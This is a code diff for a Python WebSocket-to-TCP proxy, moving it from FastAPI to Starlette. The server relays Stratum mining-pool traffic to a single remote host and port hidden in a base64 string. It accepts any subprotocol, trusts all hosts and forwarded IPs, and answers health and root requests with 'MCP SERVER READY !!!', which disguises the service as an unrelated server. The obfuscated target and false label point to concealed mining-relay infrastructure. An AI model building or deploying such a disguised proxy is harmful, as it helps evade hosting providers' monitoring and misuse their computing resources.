@@ -2,9 +2,11 @@ import os
 import asyncio
 import logging
 import base64
-import websockets
-from fastapi import FastAPI, WebSocket, WebSocketDisconnect
-from fastapi.responses import PlainTextResponse
+from starlette.applications import Starlette
+from starlette.responses import PlainTextResponse
+from starlette.routing import Route, WebSocketRoute
+from starlette.websockets import WebSocket, WebSocketDisconnect
+from starlette.middleware.trustedhost import TrustedHostMiddleware
 import uvicorn
 
 # --- Logging Setup ---
@@ -19,15 +21,6 @@ WS_PORT = int(os.environ.get("PORT", 8080))
 FIXED_TARGET = "OC4yMTUuMS40OTozNTc3Ng=="  # base64(host:port)
 MAX_PAYLOAD = 100 * 1024  # 100KB
 
-app = FastAPI(title="WebSocket to TCP Stratum Proxy")
-
-
-# --- HTTP Health Route ---
-@app.get("/api/health")
-async def root():
-    logger.info("Health check accessed")
-    return PlainTextResponse("MCP SERVER READY !!!\n")
-
 
 # --- Helpers ---
 def validate_port(port: str) -> bool:
@@ -40,7 +33,7 @@ def validate_port(port: str) -> bool:
 
 def decode_target(encoded: str):
     decoded = base64.b64decode(encoded).decode("utf-8")
-    parts = decoded.split(":")
+    parts = decoded.rsplit(":", 1)
     if len(parts) != 2:
         raise ValueError("Invalid target format")
     host, port = parts
@@ -51,99 +44,121 @@ def decode_target(encoded: str):
     return host, int(port)
 
 
-# --- WebSocket → TCP Proxy ---
-@app.websocket("/")
-async def websocket_proxy(websocket: WebSocket):
-    client_ip = websocket.client.host if websocket.client else "unknown"
-    await websocket.accept()
+# --- HTTP Health Route ---
+async def health(request):
+    logger.info("Health check accessed")
+    return PlainTextResponse("MCP SERVER READY !!!\n")
 
-    encoded = FIXED_TARGET
+
+# --- WebSocket to TCP Proxy ---
+async def websocket_proxy(websocket: WebSocket):
+    # Accept bất kể subprotocol nào client gửi lên
+    subprotocols = websocket.headers.get("sec-websocket-protocol", "")
+    requested = [s.strip() for s in subprotocols.split(",") if s.strip()]
+    accept_proto = requested[0] if requested else None
+
+    await websocket.accept(subprotocol=accept_proto)
+
+    client_host = websocket.client.host if websocket.client else "unknown"
+
+    # Decode target
     try:
-        host, port = decode_target(encoded)
+        host, port = decode_target(FIXED_TARGET)
     except Exception as err:
         logger.error(f"[ERROR] Base64 decode failed: {err}")
-        await websocket.close()
+        await websocket.close(code=1008)
         return
 
-    logger.info(f"[WS] Connecting from {client_ip} -> {host}:{port}")
+    logger.info(f"[WS] Client {client_host} -> {host}:{port}")
 
+    # Open TCP connection
     try:
         reader, writer = await asyncio.open_connection(host, port)
-        logger.info(f"[TCP] Connected from {client_ip} -> {host}:{port}")
+        logger.info(f"[TCP] Connected -> {host}:{port}")
     except Exception as err:
-        logger.error(f"[TCP ERROR] Could not connect to {host}:{port}: {err}")
-        await websocket.close()
+        logger.error(f"[TCP ERROR] {host}:{port}: {err}")
+        await websocket.close(code=1011)
         return
 
-    is_closing = False
+    stop_event = asyncio.Event()
 
     async def cleanup():
-        nonlocal is_closing
-        if is_closing:
+        if stop_event.is_set():
             return
-        is_closing = True
+        stop_event.set()
         try:
             if not writer.is_closing():
                 writer.close()
                 await writer.wait_closed()
         except Exception:
             pass
-        logger.info(f"[CLEANUP] Connection closed for {host}:{port}")
+        logger.info(f"[CLEANUP] {host}:{port} closed")
 
     async def ws_to_tcp():
-        """Forward messages from WebSocket → TCP."""
         try:
-            while not is_closing:
+            while not stop_event.is_set():
                 try:
-                    data = await asyncio.wait_for(websocket.receive_text(), timeout=60)
+                    data = await asyncio.wait_for(
+                        websocket.receive_text(), timeout=60
+                    )
                 except asyncio.TimeoutError:
                     continue
+                except WebSocketDisconnect:
+                    logger.info(f"[WS] {client_host} disconnected")
+                    break
 
                 if len(data.encode("utf-8")) > MAX_PAYLOAD:
-                    logger.warning(f"[WS→TCP] Payload too large, dropping message")
+                    logger.warning("[WS->TCP] Payload too large, dropped")
                     continue
 
                 msg = data if data.endswith("\n") else data + "\n"
                 writer.write(msg.encode("utf-8"))
                 await writer.drain()
-        except WebSocketDisconnect:
-            logger.info(f"[WS] Client {client_ip} disconnected")
         except Exception as err:
-            logger.error(f"[ERROR] WS→TCP failed: {err}")
+            logger.error(f"[WS->TCP ERROR] {err}")
         finally:
             await cleanup()
 
     async def tcp_to_ws():
-        """Forward messages from TCP → WebSocket."""
         try:
-            while not is_closing:
+            while not stop_event.is_set():
                 data = await reader.read(4096)
                 if not data:
-                    logger.info(f"[TCP] Pool socket closed for {host}:{port}")
+                    logger.info(f"[TCP] {host}:{port} closed by remote")
                     break
                 text = data.decode("utf-8", errors="replace")
                 await websocket.send_text(text)
         except Exception as err:
-            logger.error(f"[ERROR] TCP→WS failed: {err}")
+            logger.error(f"[TCP->WS ERROR] {err}")
         finally:
             await cleanup()
 
-    # Run both directions concurrently
-    await asyncio.gather(
-        ws_to_tcp(),
-        tcp_to_ws(),
-        return_exceptions=True
-    )
+    await asyncio.gather(ws_to_tcp(), tcp_to_ws(), return_exceptions=True)
+
+
+# --- App & Routing ---
+routes = [
+    Route("/health", health),
+    Route("/", health),                        # HTTP GET / -> 200 tranh 302
+    WebSocketRoute("/", websocket_proxy),
+    WebSocketRoute("/ws", websocket_proxy),
+]
+
+app = Starlette(routes=routes)
+app.add_middleware(TrustedHostMiddleware, allowed_hosts=["*"])
 
 
 # --- Entry Point ---
 if __name__ == "__main__":
-    logger.info(f"[PROXY] WebSocket listening on port: {WS_PORT}")
+    logger.info(f"[PROXY] Listening on port {WS_PORT}")
     uvicorn.run(
         "proxy_server:app",
         host="0.0.0.0",
         port=WS_PORT,
         log_level="info",
+        ws="websockets",
         ws_ping_interval=30,
         ws_ping_timeout=10,
+        proxy_headers=True,
+        forwarded_allow_ips="*",
     )
